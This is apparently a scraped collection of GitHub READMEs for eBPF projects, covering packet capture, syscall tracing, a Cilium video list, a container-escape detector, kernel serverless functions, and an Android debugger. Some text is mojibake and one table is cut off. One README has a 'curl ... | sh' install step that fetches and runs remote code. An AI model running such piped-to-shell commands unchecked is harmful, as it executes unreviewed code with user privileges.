This project centers around creating a user-friendly Rust interface to eBPF programs within the Linux kernel, specifically for network packet capture. By employing XDP, Rusty TCP enables packet processing at the earliest possible point in the network stack, directly within the network driver itself. Captured packets are then efficiently transferred to user space via a ring buffer, ready for immediate analysis or processing within your Rust applications.

Key features of Rusty TCP include:

* **High-Performance Capture:** Achieves near-line-rate packet capture with minimal kernel overhead thanks to XDP.
*   **Kernel Bypass Architecture:** Operates at the XDP layer, bypassing significant portions of the traditional kernel network stack for enhanced speed.
*   **Efficient Ring Buffer Delivery:** Utilizes a ring buffer mechanism for asynchronous and high-throughput transfer of network frames from kernel to user space.
*   **Rust and C Synergy:**  Combines the memory safety and expressiveness of Rust with the low-level system capabilities of C and eBPF for optimal performance and reliability.
*   **Modern eBPF Management:**  Integrated with the libbpf library for efficient, up-to-date eBPF program loading and lifecycle management.



## Installation

To utilize Rusty TCP, ensure the following prerequisites are installed on your system:

*   **Rust Toolchain:** A stable Rust installation is required. Installation instructions are available at [https://www.rust-lang.org/tools/install](https://www.rust-lang.org/tools/install).
*   **Clang Compiler:** Clang is necessary for compiling the eBPF program. Ensure it is installed and accessible in your system's PATH.
*   **libbpf Library:** The libbpf library and its development headers are essential for compiling and running the eBPF loader component. On Arch Linux systems, install with: `sudo pacman -S libbpf zlib`. For other distributions, use your system's package manager (eg. `apt`) to install the libbpf development packages.
*   **XDP-Enabled Linux Kernel:** Your Linux kernel must have XDP functionality enabled. Most modern Linux distributions include this support by default.

Once these prerequisites are met, you can incorporate Rusty TCP into your Rust project by adding it as a dependency in your `Cargo.toml` file:


```toml
[dependencies]
rusty_tcp = { git = ""https://github.com/FrancoKurte/rusty-tcp"" }
```

Alternatively, you can clone the repository and build the library locally:

```sh
git clone https://github.com/FrancoKurte/rusty-tcp
cd rusty-tcp
cargo build
```

## Usage

To quickly experience Rusty TCP's capabilities, explore the example provided in [examples/01/capturing_frames.rs](https://github.com/FrancoKurte/rusty-tcp/examples/01/). This example showcases basic packet capture and displays captured data in a hexdump format. For detailed instructions on running this example and understanding its output, please refer to the examples/01/README.md file within the example directory. More usage examples and comprehensive API documentation are planned for upcoming releases. Currently, the most detailed reference for library usage is the source code itself, particularly the src/xdp/capture.rs module.

## Future Prospects

Rusty TCP is envisioned to evolve into more than just a packet capture utility. A significant long-term goal for this project is the development of a complete, from-scratch TCP/IP stack implemented entirely in Rust. Motivated by the desire to explore Rust's potential in building high-performance, secure, and highly customizable networking solutions. Also, this project aims to serve as a valuable platform for education in network protocol design and implementation.

The current packet capture functionality is a foundational step towards this broader vision. By mastering eBPF and XDP for efficient data acquisition, the project is establishing the necessary groundwork to progress towards more complex network stack components. Future development will explore areas such as:

* **Integrated IP Layer**: Building an IP layer to manage network addressing, routing, and packet forwarding.

* **Rust-Native TCP Protocol Implementation**: Developing a robust and feature-complete TCP protocol implementation in Rust.


* **User-Space Networking library**: Creating a user-space networking library that leverages the custom TCP/IP stack, enabling the development of network applications directly in user space.


## Documentation

For now, please refer to the inline comments within the code for API details and usage information. As the project progresses, comprehensive documentation will be provided, including API references, usage guides, and design documents outlining the architecture of the Rust-based TCP/IP stack as it evolves.

## Contributing

Contributions to Rusty TCP are highly welcome! If you have ideas for improvements, bug fixes, or new features, especially in the areas of networking protocols, eBPF, or Rust systems programming, please contributeby reporting issues (bugs or feature requests) please open a detailed issue on the GitHub repository or submitting pull request with a clear description of your changes :)

## License

Rusty TCP is distributed under the MIT License. See the LICENSE file in the repository for the full license text.

## Contact

For any questions, suggestions, collaboration inquiries, or discussions related to Rusty TCP, please feel free to reach out:

Email: franco.kurte@gmail.com

LinkedIn: https://www.linkedin.com/in/franco-kurte-a4975b220/

Thank you!
"
dorkamotorka/ebpf-github-actions,22,3,22,0,C,Demo repository for running eBPF in GitHub Actions,2025-03-20T10:18:49Z,2025-08-19T16:01:53Z,13,"# Running eBPF in GitHub Actions
 
Demo repository for running eBPF in GitHub Actions. It includes:

- `/app` directory, where you can find eBPF related code - A simple `execve()` syscall tracer.
- `Dockerfile` for creating a container with your eBPF code
- `.github/workflows/run.yaml` GitHub action that will run the container with your eBPF code.

It is simply to prove how eBPF can be run in GitHub Actions and export some useful data. 

In this demo, it traces all the `execve()` syscalls and captures the output and saves it to an artifact to view it later.

For proper products this data would be exported to some third-party external endpoint - but this would be beyond this demo.
"
dorkamotorka/tcmonitor-ebpf,8,0,8,0,C,Repository for monitoring TC Return codes using eBPF,2025-03-16T10:25:07Z,2025-08-03T18:21:42Z,6,"# tcmonitor-ebpf

Repository for monitoring TC actions using eBPF. In other words tracing eBPF with eBPF.

While working on various eBPF projects, I often needed to trace TC eBPF return codes. And not just that, if there were multiple TC program I wanted to figure what actions does a specific one infers on the received traffic. 

tcmonitor-ebpf attaches to the specified TC program (using the `-i` or `--tc-program-id` flag) and monitors all possible actions an TC program can enforce on packets.

## How to use it

First, using `bpftool` find the TC program ID:
```
$ sudo bpftool prog
```

Then just run the `tcmonitor-ebpf`:
```
$ sudo ./tcmonitor-ebpf -i <tc-program-id>
```
~      
"
nvibert/cilium-weekly,33,2,33,0,,A repo listing all the Cilium Weekly videos!,2023-09-04T09:33:36Z,2025-08-29T16:18:03Z,51,"![image](https://github.com/nvibert/cilium-weekly/assets/28391130/55d5f02b-6796-4b93-8c3d-f06f251a7104)

A repo listing all the Cilium Weekly videos!

# Introduction

Hi! I am Nico Vibert - Senior Staff Technical Marketing at Isovalent, the company behind the cloud networking platform Cilium. 

Since August 2022, I started posting regular posts and videos on LinkedIn highlighting a [Cilium](https://github.com/cilium/cilium) feature.

It's become so regular I now call it **Cilium Weekly** !

While I tend to explore the brand new features of Cilium as they are being developed and released, I sometimes touch on side projects like Hubble and [Tetragon](https://tetragon.cilium.io/), on adjacent projects like [Gateway API](https://gateway-api.sigs.k8s.io/) and the broader Kubernetes eco-system. I also occasionally post videos highlighting features only available on the Isovalent [Enterprise edition](https://isovalent.com/product/) of Cilium.

By the way, outside of Cilium Weekly, I also create a lot of Cilium content: blog posts, videos, free hands-on labs, etc... You can find it all on our [website](https://isovalent.com/resource-library/).

# Episode Request and Feedback

If you'd like me to cover a specific topic that is not yet covered below, please raise an issue on this repo. You can also find me on [LinkedIn](https://www.linkedin.com/in/nicolasvibert/).

If you'd also like to share some feedback about the videos, feel free to get in touch. 

If you'd like to be notified when a new episode is released, you can either follow me on [LinkedIn](https://www.linkedin.com/in/nicolasvibert/), Watch this repo or do both! 

Don't hesitate to share this repo with your peers if you find it useful. 

# Roadmap

## Episode Roadmap

- Egress Gateway
- BBR
- Cilium and KubeVirt + BGP
- BGP Attributes Advertisement
- IPv6 LB-IPAM
- Multi-Pool support with BGP
- KV Store Mesh
- Kyverno & Network Policies
- Cilium Certified Associate (CCA)
- L2 Pod Announcement
- ClusterIP support

# Episode Listing 

| Episode  | Month      | Title                                        | LinkedIn Link                                                                                                         | Category                                      |
|----------------|------------|----------------------------------------------|-----------------------------------------------------------------------------------------------------------------------|:------------------------------------------:|
| 61             | August 2025   | Cilium 1.18 Highlights (Guest spot by [@saintdle](https://github.com/saintdle))   | [LinkedIn Link](https://www.linkedin.com/posts/saintdle_a-little-bit-of-fun-recording-cilium-weekly-activity-7361667832218034178-6YnQ?utm_source=share&utm_medium=member_desktop&rcm=ACoAABU24foBBmBIg9NuWcjKWa7JwL83L6PGU68) | CNI |
| 60             | August 2025   | Encrypted Overlay                      | [LinkedIn Link](https://www.linkedin.com/posts/nicolasvibert_in-this-weeks-cilium-weekly-i-cover-a-new-activity-7358844639589588993-QBHB?utm_source=share&utm_medium=member_desktop&rcm=ACoAAABDwcsBw6-avWMC5pYGQl8wvdqhlB6ZJl0) | Security |
| 59             | May 2025   | Calico -> Cilium Converter Tool                       | [LinkedIn Link](https://www.linkedin.com/posts/nicolasvibert_one-of-the-biggest-blockers-for-users-migrating-activity-7330570094021939200-eDwU?utm_source=share&utm_medium=member_desktop&rcm=ACoAAABDwcsBw6-avWMC5pYGQl8wvdqhlB6ZJl0) | Network Policy |
| 58             | May 2025   | Route Aggregation                       | [LinkedIn Link](https://www.linkedin.com/posts/nicolasvibert_in-this-weeks-cilium-weekly-i-cover-a-new-activity-7326247333338181632-SOrM?utm_source=share&utm_medium=member_desktop&rcm=ACoAAABDwcsBw6-avWMC5pYGQl8wvdqhlB6ZJl0) | BGP & External Networking |
| 57             | March 2025 | Auto Route Injection and Native Routing | [LinkedIn Link](https://www.linkedin.com/posts/nicolasvibert_this-weeks-cilium-weekly-focuses-on-a-nice-activity-7310255927645949953-PG16?utm_source=share&utm_medium=member_desktop&rcm=ACoAAABDwcsBw6-avWMC5pYGQl8wvdqhlB6ZJl0) | CNI |
| 56             | March 2025 | Ingress Bandwidth Manager                | [LinkedIn Link](https://www.linkedin.com/posts/nicolasvibert_in-todays-cilium-weekly-i-look-at-an-upcoming-activity-7303368997553487872-50nB?utm_source=share&utm_medium=member_desktop&rcm=ACoAAABDwcsBw6-avWMC5pYGQl8wvdqhlB6ZJl0) | CNI |
| 55             | March 2025 | VXLAN Encapsulation               | [LinkedIn Link](https://www.linkedin.com/posts/nicolasvibert_in-todays-cilium-weekly-i-wanted-to-explain-activity-7302621357547171840-BVj8?utm_source=share&utm_medium=member_desktop&rcm=ACoAAABDwcsBw6-avWMC5pYGQl8wvdqhlB6ZJl0) | CNI |
| 54             | February 2025 | An Introduction to Cilium           | [Cisco Live](https://www.ciscolive.com/on-demand/on-demand-library.html?zid=global&search=BRKCLD-2696#/session/1740098278606001dYa6) | General Introduction |
| 53             | February 2025 | IPAM ENI Prefix Delegation (EKS)              | [LinkedIn Link](https://www.linkedin.com/posts/nicolasvibert_in-todays-cilium-weekly-i-cover-a-feature-activity-7287806165256732672-7n6b?utm_source=share&utm_medium=member_desktop&rcm=ACoAAABDwcsBw6-avWMC5pYGQl8wvdqhlB6ZJl0) | CNI |
| 52             | November 2024  | Selective Encryption    | [LinkedIn Link](https://www.linkedin.com/posts/nicolasvibert_in-this-weeks-cilium-weekly-i-cover-a-new-activity-7256983854891069440-sqtm?utm_source=share&utm_medium=member_desktop&rcm=ACoAAABDwcsBw6-avWMC5pYGQl8wvdqhlB6ZJl0) | Security |
| 51             | October 2024  | Per-tunnel IPsec keys    | [LinkedIn Link](https://www.linkedin.com/posts/nicolasvibert_in-this-weeks-cilium-weekly-i-wanted-to-activity-7242859190409465857-Aa-7?utm_source=share&utm_medium=member_desktop&rcm=ACoAAABDwcsBw6-avWMC5pYGQl8wvdqhlB6ZJl0) | Security |
| 50             | September 2024  | Gateway API Specific IP address Request     | [LinkedIn Link](https://www.linkedin.com/posts/nicolasvibert_ever-since-cilium-116-came-out-at-the-end-activity-7239247800155189249-9kHs?utm_source=share&utm_medium=member_desktop&rcm=ACoAAABDwcsBw6-avWMC5pYGQl8wvdqhlB6ZJl0) | Service Mesh & Ingress/Gateway API |
| 49             | August 2024  | Load Network Policies from Filesystem  | [LinkedIn Link](https://www.linkedin.com/posts/nicolasvibert_arriving-very-soon-with-cilium-116-the-activity-7221494836405698561--lGe?utm_source=share&utm_medium=member_desktop&rcm=ACoAAABDwcsBw6-avWMC5pYGQl8wvdqhlB6ZJl0) | Security |
| 48             | May 2024  | Port Range Support in Network Policy     | [LinkedIn Link](https://www.linkedin.com/posts/nicolasvibert_cilium-116-brings-support-for-a-long-awaited-activity-7213916308936028160-C6oi?utm_source=share&utm_medium=member_desktop&rcm=ACoAAABDwcsBw6-avWMC5pYGQl8wvdqhlB6ZJl0) | Security |
| 47             | July 2024 | BFD             | [LinkedIn Link](https://www.linkedin.com/posts/nicolasvibert_with-containerlab-i-can-build-a-virtual-activity-7212115285246451713-QDan?utm_source=share&utm_medium=member_desktop&rcm=ACoAAABDwcsBw6-avWMC5pYGQl8wvdqhlB6ZJl0) | BGP & External Networking |
| 46             | July 2024 | Local Redirect Policy              | [LinkedIn Link](https://www.linkedin.com/posts/nicolasvibert_in-%F0%9D%98%8A%F0%9D%98%AA%F0%9D%98%AD%F0%9D%98%AA%F0%9D%98%B6%F0%9D%98%AE-%F0%9D%98%9E%F0%9D%98%A6%F0%9D%98%A6%F0%9D%98%AC%F0%9D%98%AD%F0%9D%98%BA-%F0%9D%98%8C%F0%9D%98%B1%F0%9D%98%AA%F0%9D%98%B4%F0%9D%98%B0%F0%9D%98%A5-activity-7219624925123223552-REtO?utm_source=share&utm_medium=member_desktop&rcm=ACoAAABDwcsBw6-avWMC5pYGQl8wvdqhlB6ZJl0) | CNI |
| 45             | July 2024 | Service Traffic Distribution              | [LinkedIn Link](https://www.linkedin.com/posts/nicolasvibert_cilium-116-will-support-kubernetess-3rd-activity-7211373294019592192-8pyI?utm_source=share&utm_medium=member_desktop&rcm=ACoAAABDwcsBw6-avWMC5pYGQl8wvdqhlB6ZJl0) | Service Mesh & Ingress/Gateway API |
| 44             | June 2024 | Cilium Gateway API GAMMA                | [LinkedIn Link](https://www.linkedin.com/posts/nicolasvibert_in-this-weeks-cilium-weekly-i-cover-a-new-activity-7208839190573137931-AR7e?utm_source=share&utm_medium=member_desktop) | Service Mesh & Ingress/Gateway API |
| 43             | May 2024  | Multicast on Kubernetes with Cilium     | [LinkedIn Link](https://www.linkedin.com/posts/nicolasvibert_in-episode-43-of-cilium-weekly-i-cover-a-activity-7193536716744335360-2M8O?utm_source=share&utm_medium=member_desktop) | CNI |
| 42             | January 2024  | gRPC Routing with Cilium Gateway API      | [LinkedIn Link](https://www.linkedin.com/posts/nicolasvibert_the-upcoming-cilium-115-adds-support-for-activity-7153778923909124097-syTp?utm_source=share&utm_medium=member_desktop) | Service Mesh & Ingress/Gateway API |
| 41             | December 2023 | Terraform Provider for Cilium             | [LinkedIn Link](https://www.linkedin.com/posts/nicolasvibert_cilium-activity-7141043834196520960-tWF3?utm_source=share&utm_medium=member_desktop) | GitOps & Infra As Code |
| 40             | December 2023 | Contributing to Cilium Docs               | [LinkedIn Link](https://www.linkedin.com/posts/nicolasvibert_in-this-weeks-cilium-weekly-episode-40-activity-7137463231081558016-8Eip?utm_source=share&utm_medium=member_desktop) | CNI |
| 39             | November 2023 | BGP MD5 Authentication                    | [LinkedIn Link](https://www.linkedin.com/posts/nicolasvibert_in-this-new-episode-of-cilium-weekly-episode-activity-7135262135843999745-GERn?utm_source=share&utm_medium=member_desktop) | BGP & External Networking |
| 38             | November 2023 | Cilium Multi Network                      | [LinkedIn Link](https://www.linkedin.com/posts/nicolasvibert_cilium-activity-7125856868249264128-yhz7?utm_source=share&utm_medium=member_desktop) | CNI |
| 37             | October 2023 | BGP over IPv6                          | [LinkedIn Link](https://www.linkedin.com/posts/nicolasvibert_cilium-activity-7120714338662768640-L24g?utm_source=share&utm_medium=member_desktop) | BGP & External Networking |
| 36             | October 2023 | Multi-Pool IPAM                            | [LinkedIn Link](https://www.linkedin.com/posts/nicolasvibert_cilium-activity-7117789679810191360-oSxf?utm_source=share&utm_medium=member_desktop) | CNI |
| 35             | October 2023 | NAT46 & NAT64                              | [LinkedIn Link](https://www.linkedin.com/posts/nicolasvibert_cilium-activity-7115247365220913153-BImJ?utm_source=share&utm_medium=member_desktop) | Networking |
| 34             | September 2023 | Bandwidth Manager                        | [LinkedIn Link](https://www.linkedin.com/posts/nicolasvibert_in-episode-34-of-cilium-weekly-i-cover-a-activity-7112015058301251584-kqSH?utm_source=share&utm_medium=member_desktop) | CNI |
| 33             | September 2023 | Traffic Mirroring                        | [LinkedIn Link](https://www.linkedin.com/posts/nicolasvibert_in-episode-33-of-cilium-weekly-i-explore-activity-7109468624926425090-ZBLy?utm_source=share&utm_medium=member_desktop) |  Service Mesh & Ingress/Gateway API |
| 32             | September 2023 | BGP Route Visibility                     | [LinkedIn Link](https://www.linkedin.com/posts/nicolasvibert_episode-32-of-cilium-weekly-bgp-routes-status-activity-7106963632923521025-0rY-?utm_source=share&utm_medium=member_desktop) | BGP & External Networking |
| 31             | September 2023 | HTTP Redirect with Cilium Gateway API    | [LinkedIn Link](https://www.linkedin.com/posts/nicolasvibert_episode-31-of-cilium-weekly-http-redirect-activity-7104817213613686784-GvzD?utm_source=share&utm_medium=member_desktop) | Service Mesh & Ingress/Gateway API
| 30             | August 2023 | External Traffic Policy                     |   [LinkedIn Link](https://www.linkedin.com/posts/nicolasvibert_new-cilium-feature-this-week-and-my-activity-7102264123861688321-bZq1?utm_source=share&utm_medium=member_desktop)                                                                                                                    | BGP & External Networking                                    |
| 29               | July 2023   | Mutual Authentication                       | [LinkedIn Link](https://www.linkedin.com/posts/nicolasvibert_new-cilium-feature-this-week-mutual-authentication-activity-7091814688023269376-wQ8S?utm_source=share&utm_medium=member_desktop) | Security                                    |
| 28             | July 2023   | L2 Announcements                            | [LinkedIn Link](https://lnkd.in/ed36MAnK)                                                                           | BGP & External Networking                                    |
| 27             | July 2023   | BIG TCP for IPv4                            | [LinkedIn Link](https://lnkd.in/e8xDpAAa)                                                                         | CNI                                    |
| 26             | July 2023   | Envoy deployed as a DaemonSet              | [LinkedIn Link](https://lnkd.in/e3YwtCxf)                                                                         | Service Mesh                                    |
| 25               | June 2023   | Layer 7 Network Policies with Cilium WireGuard encryption | [LinkedIn Link](https://lnkd.in/eUS8QA6U)                                                                  | BGP & External Networking                                    |
| 24             | June 2023   | BGP Graceful Restart                        | [LinkedIn Link](https://lnkd.in/eu3hbU2w)                                                                         | BGP & External Networking                                    |
| 23             | June 2023   | eBGP Multihop                               | [LinkedIn Link](https://lnkd.in/e4uYCtU7)                                                                         | BGP & External Networking                                    |
| 22             | June 2023   | BGP Timers                                  | [LinkedIn Link](https://lnkd.in/eu4r5AHF)                                                                         | BGP & External Networking                                    |
| 21             | June 2023   | TLS Passthrough, using the Cilium Gateway API TLSRoute | [LinkedIn Link](https://lnkd.in/eeJ68-mq)                                                              | Service Mesh & Ingress/Gateway API                                    |
| 20               | May 2023    | Golden Signals, Hubble and Grafana          | [LinkedIn Link](https://www.linkedin.com/posts/nicolasvibert_this-weeks-new-cilium-feature-is-all-about-activity-7062404505904009216-AyOI?utm_source=share&utm_medium=member_desktop) | Observability                                    |
| 19             | May 2023    | From FQDN in Network Policy                | [LinkedIn Link](https://www.linked"
elijahu1/ebpf-container-security,11,0,11,0,C,eBPF container escape detector prototype | Kernel 6.8+ | Early dev phase | Expect kernel panics âš ï¸,2025-03-10T21:32:31Z,2025-08-03T18:21:36Z,50,"# eBPF Container Security Monitor (Early Development)

ðŸ” *eBPF-based container escape detection prototype | Kernel 6.8+ | Early development stage | Not production-ready*

âš ï¸ **Experimental Project**  
This is a work-in-progress eBPF-based container escape detection system. Currently in active development - detection logic and alerting are not fully functional yet.

## Current State
- Basic eBPF program loading works
- Syscall tracing infrastructure in place
- Detection patterns under development
- **No reliable alerts generated yet**

## Prerequisites
- Ubuntu 22.04+ (AWS EC2 tested)
- Linux kernel 6.8+
- clang 14+, libbpf-dev, bpftool

## Installation
```bash
sudo apt update && sudo apt install -y clang llvm libbpf-dev linux-headers-$(uname -r) bpftoolgit clone https://github.com/yourusername/ebpf-container-security.git
git clone https://github.com/elijahu1/ebpf-container-security.git
make build
```

## Usage
```bash
# Load detector
sudo ./bin/loader

# In another terminal, monitor logs
sudo cat /sys/kernel/debug/tracing/trace_pipe

# Trigger test (no alerts expected yet)
docker run --rm ubuntu unshare --user
```

## Docker Development Environment
Rebuild the exact testing environment:
```bash
# Build image (from project root)
docker build -t ebpf-monitor-dev .

# Run with host kernel headers access
docker run -it --rm \
  -v /lib/modules:/lib/modules:ro \
  -v /usr/src:/usr/src:ro \
  -v $(pwd):/app \
  ebpf-monitor-dev

# Inside container:
make build && sudo ./bin/loader
```

**Key Limitations**:
- Requires host kernel 6.8+
- Bind mounts needed for kernel headers
- BPF programs interact directly with host kernel

## Troubleshooting
If you get no output:
- Verify kernel version matches headers: `uname -r`
- Check BPF program load: `sudo bpftool prog list`
- Ensure tracing is enabled: `sudo sh -c 'echo 1 > /sys/kernel/debug/tracing/tracing_on'`

## Roadmap
- [ ] Basic container escape detection
- [ ] Alert filtering
- [ ] Integration with container runtimes
- [ ] Production deployment guide

## License
This project is licensed under [GNU GPLv3](LICENSE.md)

---

**Contributions welcome!** See [CONTRIBUTING.md](CONTRIBUTING.md) for development guidelines.
```

"
Kiinitix/KernelFaaS,29,0,29,0,Rust,eBPF-Direct is a high-performance serverless execution layer that runs functions directly inside the Linux kernel using eBPF,2025-03-23T12:10:04Z,2025-09-20T08:21:18Z,5,"# **KernelFaaS**

Blog: https://kiiocity.wordpress.com/2025/03/23/breaking-serverless-limits-running-functions-directly-in-the-kernel-with-ebpf/

KernelFaaS is a high-performance serverless execution layer that runs functions directly inside the Linux kernel using eBPF. Traditional serverless platforms like AWS Lambda introduce delays due to cold starts, virtualization, and user-space overhead. KernelFaaS eliminates these bottlenecks by executing functions at the kernel level, reducing execution time to microseconds.

This approach is useful for applications that require near-instant response times, such as high-frequency trading, real-time fraud detection, and cybersecurity threat mitigation.

## **How It Works**

Instead of running functions on top of the operating system, KernelFaaS allows functions to be safely executed inside the Linux kernel. This removes the need for context switching and significantly reduces latency. The system ensures stability and security with built-in execution limits, resource isolation, and observability tools.

## **Installation**

### **Prerequisites**

- Linux with eBPF support (Kernel 5.4+ recommended)
- Docker (optional, for containerized deployment)
- Rust (for building the CLI)
- Clang & LLVM (for compiling eBPF programs)

### **Manual Installation**

1. Clone the repository:
   ```sh
   git clone https://github.com/Kiinitix/KernelFaaS 
   cd KernelFaaS
   ```  

2. Install dependencies:
   ```sh
   sudo apt update && sudo apt install clang llvm libelf-dev libbpf-dev build-essential -y
   ```  

3. Build the project:
   ```sh
   cargo build --release
   ```  

4. Run the CLI:
   ```sh
   ./target/release/KernelFaaS run --function example.ebpf
   ```  

### **Docker Installation**

1. Install Docker:
   ```sh
   curl -fsSL https://get.docker.com | sh
   sudo usermod -aG docker $USER
   ```  

2. Build and run the container:
   ```sh
   docker build -t KernelFaaS .
   docker run --privileged --rm KernelFaaS  
   ```  

The `--privileged` flag is required because eBPF interacts with the kernel.

## **Why KernelFaaS?**

Existing serverless platforms rely on user-space execution, which introduces unnecessary delays. KernelFaaS takes advantage of eBPFâ€™s ability to run in the kernel safely, making real-time computing more efficient without compromising security.

Feel free to open issues or contribute by submitting pull requests!  

"
theihor/bpfvv,45,4,45,12,TypeScript,A tool to help programmers debug and analyze Linux Kernel BPF verification failures.,2025-03-06T00:52:01Z,2025-10-08T21:18:17Z,134,"> [!WARNING]
> The bpfvv app is in early stages of development, and you should expect
> bugs, UI inconveniences and significant changes from week to week.
>
> If you're working with BPF and you think this tool (or a better
> version of it) would be useful, feel free to use it and don't be shy
> to report issues and request features via github. Thanks!

[![CI](https://github.com/libbpf/bpfvv/actions/workflows/ci.yml/badge.svg)](https://github.com/libbpf/bpfvv/actions/workflows/ci.yml)

**bpfvv** stands for BPF Verifier Visualizer

https://libbpf.github.io/bpfvv/

This project is an experiment about visualizing Linux Kernel BPF verifier log to help BPF programmers with debugging verification failures.

The user can load a text file, and the app will attempt to parse it as a verifier log. Successfully parsed lines produce a state which is then visualized in the UI. You can think of this as a primitive debugger UI, except it interprets a log and not a runtime state of a program.

## Development

- Fork the website repo: https://github.com/libbpf/bpfvv.git

- Clone your fork:
    - `git clone https://github.com/<username>/bpfvv.git`

- Setup node modules:
	- `npm install`

- Develop the app:
	- `npm start`

- Build the app for static testing:
	- `npm run build`

- Serve the statically built app:
	- `npm run serve`

- Format your code:
	- `npm run format`

- To run lint, typecheck, and tests:
	- `npm run check`

- If everything is OK, push your branch, create a PR.

---

This is a self-contained web app that runs entirely on the client side. There is no backend server. Once loaded, it operates within the browser.

* To learn more about BPF visit https://ebpf.io/
* See also: https://github.com/eddyz87/log2dot
"
microsoft/jbpf,59,17,59,17,C,Userspace eBPF instrumentation and control framework for deploying control and monitoring functions in a secure manner,2024-09-10T09:07:56Z,2025-09-25T18:02:39Z,86,"# Introduction
[![Build Status](https://belgrade.visualstudio.com/jbpf/_apis/build/status%2Fjbpf-jbpf?repoName=microsoft%2Fjbpf&branchName=main)](https://belgrade.visualstudio.com/jbpf/_build/latest?definitionId=145&repoName=microsoft%2Fjbpf&branchName=main) [![JBPF Docker Build and Tests (ARM64)](https://github.com/microsoft/jbpf/actions/workflows/docker-build-and-test-arm.yaml/badge.svg)](https://github.com/microsoft/jbpf/actions/workflows/docker-build-and-test-arm.yaml) [![JBPF Docker Build and Tests (AMD64)](https://github.com/microsoft/jbpf/actions/workflows/docker_build_and_test.yaml/badge.svg)](https://github.com/microsoft/jbpf/actions/workflows/docker_build_and_test.yaml)

Userspace eBPF instrumentation and control framework for deploying control and monitoring functions in a secure manner. It is part of [Project Janus](https://www.microsoft.com/en-us/research/project/programmable-ran-platform/) and provides probes for eBPF-like functionality outside of the Linux kernel.


# Architectural overview

![Architectural overview](docs/jbpf_oss_architecture.png)

The overall jbpf architecture is shown in the figure above. It consists of the following main components:
* **Application**: It is a user-provided executable that we want to instrument and control, built so that it is linked with the libjbpf library.
* **jbpf library**: The library that provides the functionality of deploying and executing codeletes, sending output data (output API) and receiving control data (input API).
* **Management framework**: This a framework to load/unload codelets (*codelet life-cycle management* and *secure codelet store*), collect telemetry and excert control (*data collection and control*) and build and deploy codelets (*codelet management*).

jbpf is not prescriptive in how the management framework should be built. It provides several APIs in the form of libraries: [`libjbpf_lcm`](docs/life_cycle_management.md) (life-cycle management), [`libjbpf_io`](docs/data_io.md) (input and output API) and [`libjbpf_verifier`](docs/verifier.md) (extended verifier), and a sample implementation of the management framework using the APIs. It expects that each user will use the APIs to integrate jbpf into their own prodution environment. 

For a high-level overview of the framework functionality, please read [this](./docs/overview.md). 



# Getting started

To build the library, [install the dependencies](./docs/dependencies.md), and run the following:
```
source ./setup_jbpf_env.sh
mkdir build
cd build
cmake ..
make -j
```
Check [here](./CMakeLists.txt) to see build options. 

Then follow [these](./examples/first_example_standalone/README.md) steps to run a simple example and read [here](./docs/understand_first_codelet.md) to understand the example better.
Other variants of this example can be found [here](./examples/first_example_ipc/) and [here](./examples/reverse_proxy/).

## Doxygen documentation
You can generate the documentation using Doxygen. To do so, run the following:
```
make doc
```

The documentation will be generated in the `$OUT_DIR/docs/html` directory.


## Supported architectures
jbpf supports both x86_64 and aarch64. However, jbpf uses ubpf to run userspace eBPF code, and ubpf does not support atomics for ARM. Therefore, users compiling for ARM should be aware that certain functionailities of jbpf will not be available.


# Further documentation

To learn further, explore our documentation:

* [High-level overview of *jbpf* instrumentation and control process](./docs/overview.md)
* Developing codelets:
  - [Writing your first codelet](./docs/understand_first_codelet.md)
* Integrating jbpf with your own project: 
  - [Install dependencies](./docs/dependencies.md)
  - [Integrate libjbpf](./docs/integrate_lib.md)
  - [Add new hook](./docs/add_new_hook.md)
  - [Add new helper function](./docs/add_helper_function.md)
  - [Add maps](./docs/maps.md)
  - [Verification](./docs/verifier.md)
  - [Data collection and control](./docs/data_io.md)
  - [Codelet life-cycle management](./docs/life_cycle_management.md)
  - [Best security principles](./docs/security.md)
* Experimental features:
  - [Serialization of IO messages](./docs/serde.md)
* Contributing to the framework:
  - [How to contribute?](./CONTRIBUTING.md)
  - [How to add a test?](./jbpf_tests/README.md)



For more information, also consider:
- [jbpf technical paper](https://www.microsoft.com/en-us/research/publication/taking-5g-ran-analytics-and-control-to-a-new-level/): A research paper that describes the motivation behind the framework. The paper is focused on 5G RAN instrumentation, but most concepts extend to arbitrary applications. 

# Related projects

- [jrt-controller](https://github.com/microsoft/jrt-controller): The real-time controller for network functions that uses instrumentation and control from *jbpf*. Both are parts of [Project Janus](https://www.microsoft.com/en-us/research/project/programmable-ran-platform/) and provide functionalities envisaged by the concept of real-time RIC in O-RAN.

- Sample integration with [srsRAN](https://github.com/srsran/srsRAN_Project), which consists of two parts: 
  * A [version of srsRAN](https://github.com/xfoukas/srsRAN_Project_jbpf) integrated with *jbpf*.
  * A number of [sample applications](https://github.com/microsoft/jrtc-apps) for *jbpf* and *jrt-controller* on top of *srsRAN*.

- [jbpf-protobuf](https://github.com/microsoft/jbpf-protobuf): The *jbpf* extension, used in *jrt-controller*, that demonstrates how to utilize protobuf serialization for sending and receiving data from codelets loaded in jbpf applications.

# License

The jbpf framework is licensed under the [MIT license](LICENSE.md).
"
ShinoLeah/eDBG,691,75,691,4,C,eBPF-based lightweight debugger for Android,2025-03-10T07:45:27Z,2025-10-10T21:18:08Z,66,"<div align=""center"">
  <img src=""logo.png""/>
  
  [![GitHub Release](https://img.shields.io/github/v/release/ShinoLeah/eDBG?style=flat-square)](https://github.com/ShinoLeah/eDBG/releases)
  [![License](https://img.shields.io/github/license/ShinoLeah/eDBG?style=flat-square)](LICENSE)
  [![Platform](https://img.shields.io/badge/platform-Android%20ARM64-red.svg?style=flat-square)](https://www.android.com/)
  ![GitHub Repo stars](https://img.shields.io/github/stars/ShinoLeah/eDBG)

  ç®€ä½“ä¸­æ–‡ | [English](README_EN.md)
</div>

> eDBG æ˜¯ä¸€æ¬¾åŸºäºŽ eBPF çš„è½»é‡çº§ CLI è°ƒè¯•å™¨ã€‚<br />
>
> ç›¸æ¯”äºŽä¼ ç»Ÿçš„åŸºäºŽ ptrace çš„è°ƒè¯•å™¨æ–¹æ¡ˆï¼ŒeDBG ä¸ç›´æŽ¥ä¾µå…¥æˆ–é™„åŠ ç¨‹åºï¼Œå…·æœ‰è¾ƒå¼ºçš„æŠ—å¹²æ‰°å’Œåæ£€æµ‹èƒ½åŠ›ã€‚

## âœ¨ ç‰¹æ€§

- åŸºäºŽ eBPF å®žçŽ°ï¼ŒåŸºæœ¬æ— è§†åè°ƒè¯•ã€‚
- æ”¯æŒå¸¸è§„è°ƒè¯•åŠŸèƒ½ï¼ˆè¯¦è§â€œå‘½ä»¤è¯¦æƒ…â€ï¼‰
